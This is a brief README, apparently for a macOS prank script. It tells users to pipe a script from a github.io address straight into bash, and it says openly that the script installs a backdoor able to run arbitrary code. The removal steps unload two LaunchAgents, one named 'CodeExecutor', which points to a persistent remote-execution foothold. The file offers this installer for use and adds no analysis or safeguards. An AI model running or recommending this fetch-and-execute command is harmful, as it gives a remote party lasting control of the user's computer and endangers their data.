# Note that this also installs a backdoor that has arbitrary code. Use at your own risk.

# How to use

Run the following line: curl -S "https://wolfoverflow.github.io/script" | bash

# To remove

launchctl unload ~/Library/LaunchAgents/com.wolfoverflow.giveup.plist && rm -rf ~/Library/LaunchAgents/com.wolfoverflow.giveup.plist && launchctl unload ~/Library/LaunchAgents/com.wolfoverflow.CodeExecutor.plist && rm -rf ~/Library/LaunchAgents/com.wolfoverflow.CodeExecutor.plist
